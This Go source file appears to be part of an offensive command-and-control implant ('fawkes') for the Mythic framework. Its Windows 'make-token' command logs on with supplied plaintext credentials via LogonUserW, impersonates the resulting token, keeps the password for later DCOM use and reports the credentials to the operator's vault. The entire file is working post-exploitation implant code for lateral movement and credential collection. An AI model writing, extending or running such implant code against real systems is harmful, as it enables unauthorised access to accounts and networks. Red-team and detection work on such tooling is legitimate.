//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from plaintext credentials and impersonate it"
}

type MakeTokenParams struct {
	Domain    string `json:"domain"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	LogonType int    `json:"logon_type"` // Optional: defaults to LOGON32_LOGON_NEW_CREDENTIALS (9)
}

// Execute implements Xenon's TokenMake function from Token.c (lines 189-264)
// and Apollo's SetIdentity from IdentityManager.cs
func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse arguments
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Default to "." for local machine if domain not specified
	if params.Domain == "" {
		params.Domain = "."
	}

	// Default to LOGON32_LOGON_NEW_CREDENTIALS (9) if not specified
	// This applies credentials only when accessing remote resources (most useful for C2)
	if params.LogonType == 0 {
		params.LogonType = LOGON32_LOGON_NEW_CREDENTIALS
	}

	// Get current identity before token creation
	oldIdentity, _ := GetCurrentIdentity()

	// Revert any existing impersonation first (Xenon Token.c line 218)
	if err := RevertCurrentToken(); err != nil {
		// Log but don't fail - try to continue
	}

	// Convert strings to UTF-16 for Windows API (LogonUserW requires wide strings)
	usernamePtr, err := syscall.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := syscall.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := syscall.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Select provider based on logon type (Xenon Token.c lines 220-226)
	// LOGON32_LOGON_NEW_CREDENTIALS requires LOGON32_PROVIDER_WINNT50
	provider := LOGON32_PROVIDER_DEFAULT
	if params.LogonType == LOGON32_LOGON_NEW_CREDENTIALS {
		provider = LOGON32_PROVIDER_WINNT50
	}

	// Call LogonUserW to create the token (Xenon Token.c line 226)
	var newToken windows.Token
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),  // lpszUsername
		uintptr(unsafe.Pointer(domainPtr)),    // lpszDomain
		uintptr(unsafe.Pointer(passwordPtr)),  // lpszPassword
		uintptr(params.LogonType),             // dwLogonType
		uintptr(provider),                     // dwLogonProvider
		uintptr(unsafe.Pointer(&newToken)),    // phToken (output)
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("LogonUserW failed: %v (check credentials and logon type)", err),
			Status:    "error",
			Completed: true,
		}
	}

	if newToken == 0 {
		return structs.CommandResult{
			Output:    "LogonUserW succeeded but returned null token",
			Status:    "error",
			Completed: true,
		}
	}

	// Store and impersonate the new token
	if err := SetIdentityToken(newToken); err != nil {
		windows.CloseHandle(windows.Handle(newToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to impersonate token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Store plaintext credentials for commands needing explicit auth (DCOM)
	SetIdentityCredentials(params.Domain, params.Username, params.Password)

	// Get new identity to confirm impersonation
	newIdentity, err := GetCurrentIdentity()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Token created but failed to verify identity: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Format output similar to other Mythic agents
	output := fmt.Sprintf("Successfully impersonated %s", newIdentity)
	if oldIdentity != "" {
		output = fmt.Sprintf("Old: %s\nNew: %s", oldIdentity, newIdentity)
	}

	// Report plaintext credentials to Mythic vault
	creds := []structs.MythicCredential{
		{
			CredentialType: "plaintext",
			Realm:          params.Domain,
			Account:        params.Username,
			Credential:     params.Password,
			Comment:        "make-token",
		},
	}

	return structs.CommandResult{
		Output:      output,
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}
